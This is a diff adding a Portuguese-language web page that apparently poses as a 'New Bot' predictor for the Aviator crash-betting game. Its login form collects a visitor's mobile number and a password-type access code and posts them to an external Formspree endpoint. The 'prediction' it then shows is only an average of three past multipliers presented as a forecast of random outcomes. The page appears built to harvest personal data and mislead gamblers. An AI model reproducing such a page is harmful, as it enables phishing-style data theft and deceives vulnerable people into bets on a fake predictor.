@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>New Bot - Predictor</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: black;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        #enter-img {
+            width: 200px;
+            cursor: pointer;
+            margin-top: 100px;
+            border-radius: 10px;
+            transition: transform 0.3s;
+        }
+        
+        #enter-img:hover {
+            transform: scale(1.05);
+        }
+        
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
+        }
+        
+        input {
+            padding: 10px;
+            margin: 10px;
+            width: 250px;
+            border-radius: 5px;
+            border: none;
+            outline: none;
+            font-size: 1rem;
+        }
+        
+        button {
+            padding: 10px 20px;
+            background-color: #e91e63;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+        
+        button:hover {
+            background-color: #c2185b;
+        }
+        
+        #historico {
+            margin-top: 20px;
+        }
+        
+        #historico ul {
+            list-style: none;
+            padding: 0;
+        }
+        
+        #historico li {
+            margin-bottom: 5px;
+            font-size: 0.95rem;
+            color: #ccc;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Tela inicial -->
+    <div id="start-screen">
+        <img id="enter-img" src="./aviator.jpeg" alt="Entrar no New Bot" />
+    </div>
+
+    <!-- Tela de login -->
+    <div id="login-screen" class="hidden">
+        <h2>New Bot - Login</h2>
+        <p>Seja bem-vindo</p>
+        <form id="login-form" action="https://formspree.io/f/mldwwpnb" method="POST">
+            <p>Esperavamos por ti.</p>
+
+            <label for="phone">Número de Telemóvel:</label>
+            <input type="tel" id="phone" name="phone" placeholder="912345678" maxlength="9" required pattern="\d{9}" />
+
+            <label for="access">Código de Acesso:</label>
+            <input type="password" id="access" name="auth_code" required minlength="4" />
+
+            <!-- Honeypot (anti-spam) -->
+            <input type="text" name="_honey" style="display:none">
+
+            <!-- Redirecionamento após envio -->
+            <input type="hidden" name="_redirect" value="https://seusite.com/">
+
+            <button type="submit">Entrar</button>
+        </form>
+    </div>
+
+    <!-- Tela do predictor -->
+    <div id="predictor-screen" class="hidden">
+        <h2>New Bot - Predictor</h2>
+        <p>Digite os 3 últimos valores (velas) do Aviator:</p>
+        <input type="number" id="vela1" placeholder="Vela 1" step="0.01" required />
+        <input type="number" id="vela2" placeholder="Vela 2" step="0.01" required />
+        <input type="number" id="vela3" placeholder="Vela 3" step="0.01" required />
+        <button id="predict-btn">Prever</button>
+        <p id="resultado"></p>
+
+        <div id="historico">
+            <h3>Histórico de Previsões</h3>
+            <ul id="lista-historico"></ul>
+        </div>
+    </div>
+
+    <script>
+        // Mostrar tela de login ao clicar na imagem
+        document.getElementById('enter-img').addEventListener('click', () => {
+            document.getElementById('start-screen').classList.add('hidden');
+            document.getElementById('login-screen').classList.remove('hidden');
+        });
+
+        // Lógica do envio do formulário
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const phone = document.getElementById('phone').value.trim();
+            const access = document.getElementById('access').value.trim();
+
+            // Validação: exatamente 9 dígitos numéricos
+            const phoneRegex = /^\d{9}$/;
+
+            if (!phoneRegex.test(phone)) {
+                alert('Número de telefone inválido. Deve conter exatamente 9 dígitos numéricos.');
+                return;
+            }
+
+            try {
+                const formData = new FormData(this);
+                const response = await fetch(this.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        Accept: 'application/json'
+                    },
+                });
+
+                if (response.ok) {
+                    alert('Login enviado com sucesso!');
+                    document.getElementById('login-screen').classList.add('hidden');
+                    document.getElementById('predictor-screen').classList.remove('hidden');
+                } else {
+                    alert('Erro ao enviar. Verifique os dados e tente novamente.');
+                }
+            } catch (error) {
+                alert('Erro de rede. Verifique sua conexão.');
+                console.error(error);
+            }
+        });
+
+        // Função de previsão
+        const historico = [];
+
+        function prever() {
+            const v1 = parseFloat(document.getElementById('vela1').value);
+            const v2 = parseFloat(document.getElementById('vela2').value);
+            const v3 = parseFloat(document.getElementById('vela3').value);
+            const resultadoEl = document.getElementById('resultado');
+
+            if (isNaN(v1) || isNaN(v2) || isNaN(v3)) {
+                resultadoEl.textContent = 'Por favor, preencha todas as velas corretamente.';
+                return;
+            }
+
+            const media = (v1 + v2 + v3) / 3;
+            let previsao = '';
+
+            if (media < 2) {
+                previsao = 'Alta chance de baixa (<2x)';
+            } else if (media >= 2 && media <= 5) {
+                previsao = 'Possível média (2x a 5x)';
+            } else {
+                previsao = 'Possível alta (>5x)';
+            }
+
+            const resultadoTexto = `Previsão: ${previsao} | Média: ${media.toFixed(2)} (V1: ${v1}, V2: ${v2}, V3: ${v3})`;
+            resultadoEl.textContent = resultadoTexto;
+
+            historico.unshift(resultadoTexto);
+            if (historico.length > 5) historico.pop();
+
+            atualizarHistorico();
+
+            // Limpa os campos
+            document.getElementById('vela1').value = '';
+            document.getElementById('vela2').value = '';
+            document.getElementById('vela3').value = '';
+        }
+
+        function atualizarHistorico() {
+            const lista = document.getElementById('lista-historico');
+            lista.innerHTML = '';
+
+            historico.forEach(item => {
+                const li = document.createElement('li');
+                li.textContent = item;
+                lista.appendChild(li);
+            });
+        }
+
+        // Evento do botão de previsão
+        document.getElementById('predict-btn').addEventListener('click', prever);
+    </script>
+</body>
+
+</html>
